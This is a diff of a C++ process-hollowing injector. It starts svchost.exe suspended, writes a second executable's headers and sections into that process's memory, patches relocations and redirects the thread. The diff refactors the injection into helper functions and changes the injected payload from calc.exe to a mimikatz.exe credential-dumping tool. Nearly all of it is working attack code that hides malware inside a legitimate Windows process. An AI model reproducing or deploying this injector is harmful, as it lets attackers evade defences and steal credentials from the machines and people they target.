@@ -5,9 +5,6 @@
 #include "ProcessHollowingPE.h"
 
 
-
-
-
 bool loadPEFromDisk(LPCSTR peName, LPVOID& peContent)
 {
 	HANDLE hPe = NULL;
@@ -60,34 +57,6 @@ bool launchSusprendedProcess(LPSTR processName, LPPROCESS_INFORMATION& pi)
 	return TRUE;
 }
 
-bool getImageBaseAddr(LPVOID& destImageBase, HANDLE pHandle)
-{
-	_NtQueryInformationProcess NtQueryInformationProcess = (_NtQueryInformationProcess)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
-	PROCESS_BASIC_INFORMATION* pbi = new PROCESS_BASIC_INFORMATION();
-	ULONG returnLength = 0;
-
-	DWORD NtStatus = 0;
-
-	NtStatus = NtQueryInformationProcess(pHandle, ProcessBasicInformation, pbi, sizeof(PROCESS_BASIC_INFORMATION), &returnLength);
-	if (NtStatus != 0)
-	{
-		printf("[-] ERROR: Cannot get information on target process. ERROR code: %x\r\n", NtStatus);
-		return FALSE;
-	}
-	DWORD64 imageBaseAddrOffset = (DWORD64) pbi->PebBaseAddress + 0x10;
-
-	SIZE_T bytesRead = NULL;
-
-	if (!ReadProcessMemory(pHandle, (LPCVOID)imageBaseAddrOffset, &destImageBase, sizeof(LPVOID), &bytesRead))
-	{
-		printf("[-] ERROR: Cannot read target process memory\r\n");
-		return FALSE;
-	}
-	printf("[+] Getting image base address of target process: %p\r\n", destImageBase);
-	return TRUE;
-
-}
-
 bool retrieveNtHeaders(PIMAGE_NT_HEADERS& ntHeaders, LPVOID peContent)
 {
     PIMAGE_DOS_HEADER dosHeaders = (PIMAGE_DOS_HEADER)peContent;
@@ -109,8 +78,86 @@ bool retrieveNtHeaders(PIMAGE_NT_HEADERS& ntHeaders, LPVOID peContent)
 
 }
 
+bool copyPEinTargetProcess(HANDLE pHandle, LPVOID& allocAddrOnTarget, LPVOID peToInjectContent, PIMAGE_NT_HEADERS64 peInjectNtHeaders, PIMAGE_SECTION_HEADER& peToInjectRelocSection)
+{
 
+	peInjectNtHeaders->OptionalHeader.ImageBase = (DWORD64)allocAddrOnTarget;
+	printf("[+] Writing Header into target process\r\n");
+	if (!WriteProcessMemory(pHandle, allocAddrOnTarget, peToInjectContent, peInjectNtHeaders->OptionalHeader.SizeOfHeaders, NULL))
+	{
+		printf("[-] ERROR: Cannot write headers inside the target process. ERROR Code: %x\r\n", GetLastError());
+		return FALSE;
+	}
+	printf("\t[+] Headers write at : 0x%p\n", allocAddrOnTarget);
 
+	printf("[+] Writing section into target process\r\n");
+	
+
+	for (int i = 0; i < peInjectNtHeaders->FileHeader.NumberOfSections; i++)
+	{
+		PIMAGE_SECTION_HEADER currentSectionHeader = (PIMAGE_SECTION_HEADER)((uintptr_t)peInjectNtHeaders + 4 + sizeof(IMAGE_FILE_HEADER) + peInjectNtHeaders->FileHeader.SizeOfOptionalHeader + (i * sizeof(IMAGE_SECTION_HEADER)));
+
+		if (!strcmp((char*)currentSectionHeader->Name, ".reloc"))
+		{
+			peToInjectRelocSection = currentSectionHeader;
+			printf("\t[+] Reloc table found 0x%p offset\r\n", (LPVOID)(UINT64)currentSectionHeader->VirtualAddress);
+		}
+
+		if (!WriteProcessMemory(pHandle, (LPVOID)((UINT64)allocAddrOnTarget + currentSectionHeader->VirtualAddress), (LPVOID)((UINT64)peToInjectContent + currentSectionHeader->PointerToRawData), currentSectionHeader->SizeOfRawData, nullptr))
+		{
+			printf("[-] ERROR: Cannot write section %s in the target process. ERROR Code: %x\r\n", (char*)currentSectionHeader->Name, GetLastError());
+			return FALSE;
+		}
+		printf("\t[+] Section %s written at : 0x%p.\n", (LPSTR)currentSectionHeader->Name, (LPVOID)((UINT64)allocAddrOnTarget + currentSectionHeader->VirtualAddress));
+
+	}
+	return TRUE;
+}
+
+bool fixRelocTable(HANDLE pHandle, PIMAGE_SECTION_HEADER peToInjectRelocSection, LPVOID& allocAddrOnTarget, LPVOID peToInjectContent, DWORD64 DeltaImageBase, IMAGE_DATA_DIRECTORY relocationTable)
+{
+	printf("[+] Fixing relocation table.\n");
+	if (peToInjectRelocSection == NULL)
+	{
+		printf("No Reloc Table\r\n");
+		return FALSE;
+	}
+
+	DWORD RelocOffset = 0;
+	while (RelocOffset < relocationTable.Size)
+	{
+		const auto currentReloc = (PIMAGE_BASE_RELOCATION)((DWORD64)peToInjectContent + peToInjectRelocSection->PointerToRawData + RelocOffset);
+		RelocOffset += sizeof(IMAGE_BASE_RELOCATION);
+		const DWORD NumberOfEntries = (currentReloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(BASE_RELOCATION_ENTRY);
+		for (DWORD i = 0; i < NumberOfEntries; i++)
+		{
+			const auto currentRelocEntry = (PBASE_RELOCATION_ENTRY)((DWORD64)peToInjectContent + peToInjectRelocSection->PointerToRawData + RelocOffset);
+			RelocOffset += sizeof(BASE_RELOCATION_ENTRY);
+
+			if (currentRelocEntry->Type == 0)
+				continue;
+
+			const DWORD64 AddressLocation = (DWORD64)allocAddrOnTarget + currentReloc->VirtualAddress + currentRelocEntry->Offset;
+			DWORD64 PatchedAddress = 0;
+
+			if (!ReadProcessMemory(pHandle, (LPVOID)AddressLocation, &PatchedAddress, sizeof(DWORD64), nullptr))
+			{
+				printf("[-] ERROR: Cannot read target process memory at %p, ERROR CODE: %x\r\n", (LPVOID)((UINT64)AddressLocation), GetLastError());
+				return FALSE;
+			}
+			printf("\t[+] Address To Patch: %p -> Address Patched: %p \r\n", (VOID*)PatchedAddress, (VOID*)(PatchedAddress + DeltaImageBase));
+
+			PatchedAddress += DeltaImageBase;
+
+			if (!WriteProcessMemory(pHandle, (LPVOID)AddressLocation, &PatchedAddress, sizeof(DWORD64), nullptr))
+			{
+				printf("[-] ERROR: Cannot write into target process memory at %p, ERROR CODE: %x\r\n", (LPVOID)((UINT64)AddressLocation), GetLastError());
+				return FALSE;
+			}
+		}
+	}
+	return TRUE;
+}
 
 
 
@@ -123,9 +170,8 @@ int main()
 	PIMAGE_NT_HEADERS64 peInjectNtHeaders = NULL;
 	LPPROCESS_INFORMATION pi = new PROCESS_INFORMATION();
 	
-	LPCSTR peInject = "C:\\Windows\\System32\\calc.exe";
+	LPCSTR peInject = "C:\\Users\\user\\Downloads\\x64\\mimikatz.exe";
 	LPCSTR target = "C:\\Windows\\System32\\svchost.exe";
-	HANDLE pHandle = NULL;
 
 	if (!launchSusprendedProcess((LPSTR)target, pi))
 		exit(1);
@@ -139,83 +185,25 @@ int main()
 
 	LPVOID allocAddrOnTarget = NULL;
 	allocAddrOnTarget = VirtualAllocEx(pi->hProcess, NULL, peInjectNtHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	const DWORD64 DeltaImageBase = (DWORD64)allocAddrOnTarget - peInjectNtHeaders->OptionalHeader.ImageBase;
 
 	if (allocAddrOnTarget == NULL)
 	{
 		printf("[-] ERROR: Failed to allocate memory on target process\r\n");
 		exit(1);
 	}
+
 	printf("[+] Memory allocate at : 0x%p\n", (LPVOID)(uintptr_t)allocAddrOnTarget);
-	const DWORD64 DeltaImageBase = (DWORD64)allocAddrOnTarget - peInjectNtHeaders->OptionalHeader.ImageBase;
-
-	peInjectNtHeaders->OptionalHeader.ImageBase = (DWORD64) allocAddrOnTarget;
-	printf("[+] Writing Header into target process\r\n");
-	if (!WriteProcessMemory(pi->hProcess, allocAddrOnTarget, peToInjectContent, peInjectNtHeaders->OptionalHeader.SizeOfHeaders, NULL)) 
-	{
-		printf("[-] ERROR: Cannot write headers inside the target process. ERROR Code: %x\r\n", GetLastError());
-		exit(1);
-	}
-	printf("\t[+] Headers write at : 0x%p\n", allocAddrOnTarget);
-
-	printf("[+] Writing section into target process\r\n");
+	
 	IMAGE_DATA_DIRECTORY relocationTable = peInjectNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
-
 	PIMAGE_SECTION_HEADER peToInjectRelocSection = NULL;
 
-	for (int i = 0; i < peInjectNtHeaders->FileHeader.NumberOfSections; i++)
-	{
-		PIMAGE_SECTION_HEADER currentSectionHeader = (PIMAGE_SECTION_HEADER)((uintptr_t)peInjectNtHeaders + 4 + sizeof(IMAGE_FILE_HEADER) + peInjectNtHeaders->FileHeader.SizeOfOptionalHeader + (i * sizeof(IMAGE_SECTION_HEADER)));
-		
-		if (!strcmp((char*)currentSectionHeader->Name, ".reloc"))
-		{
-			peToInjectRelocSection = currentSectionHeader;
-			printf("\t[+] Reloc table found 0x%p offset\r\n", (LPVOID)(UINT64)currentSectionHeader->VirtualAddress);
-		}
-			
-
-		
-		if (!WriteProcessMemory(pi->hProcess, (LPVOID)((UINT64)allocAddrOnTarget + currentSectionHeader->VirtualAddress), (LPVOID)((UINT64)peToInjectContent + currentSectionHeader->PointerToRawData), currentSectionHeader->SizeOfRawData, nullptr))
-		{
-			printf("[-] ERROR: Cannot write section %s in the target process. ERROR Code: %x\r\n", (char*)currentSectionHeader->Name, GetLastError());
-			exit(1);
-		}
-		printf("\t[+] Section %s written at : 0x%p.\n", (LPSTR)currentSectionHeader->Name, (LPVOID)((UINT64)allocAddrOnTarget + currentSectionHeader->VirtualAddress));
-
-	}
-	if (peToInjectRelocSection == NULL)
-	{
-		printf("No Reloc Table\r\n");
+	if (!copyPEinTargetProcess(pi->hProcess, allocAddrOnTarget, peToInjectContent, peInjectNtHeaders, peToInjectRelocSection))
 		exit(1);
-	}
 
-	DWORD RelocOffset = 0;
-	while (RelocOffset < relocationTable.Size)
-	{
-		const auto lpImageBaseRelocation = (PIMAGE_BASE_RELOCATION)((DWORD64)peToInjectContent + peToInjectRelocSection->PointerToRawData + RelocOffset);
-		RelocOffset += sizeof(IMAGE_BASE_RELOCATION);
-		const DWORD NumberOfEntries = (lpImageBaseRelocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(BASE_RELOCATION_ENTRY);
-		for (DWORD i = 0; i < NumberOfEntries; i++)
-		{
-			const auto lpImageRelocationEntry = (PBASE_RELOCATION_ENTRY)((DWORD64)peToInjectContent + peToInjectRelocSection->PointerToRawData + RelocOffset);
-			RelocOffset += sizeof(BASE_RELOCATION_ENTRY);
-
-			if (lpImageRelocationEntry->Type == 0)
-				continue;
-
-			const DWORD64 AddressLocation = (DWORD64)allocAddrOnTarget + lpImageBaseRelocation->VirtualAddress + lpImageRelocationEntry->Offset;
-			DWORD64 PatchedAddress = 0;
-
-			ReadProcessMemory(pi->hProcess, (LPVOID)AddressLocation, &PatchedAddress, sizeof(DWORD64), nullptr);
-			printf("[+] Address To Patch: %p -> Address Patched: %p \r\n", (VOID*)PatchedAddress, (VOID*)(PatchedAddress + DeltaImageBase));
-
-			PatchedAddress += DeltaImageBase;
-
-			WriteProcessMemory(pi->hProcess, (LPVOID)AddressLocation, &PatchedAddress, sizeof(DWORD64), nullptr);
-
-		}
-	}
-
-	printf("[+] Relocations done.\n");
+	if (!fixRelocTable(pi->hProcess, peToInjectRelocSection, allocAddrOnTarget, peToInjectContent, DeltaImageBase, relocationTable))
+		exit(1);
+	
 
 	CONTEXT CTX = {};
 	CTX.ContextFlags = CONTEXT_FULL;
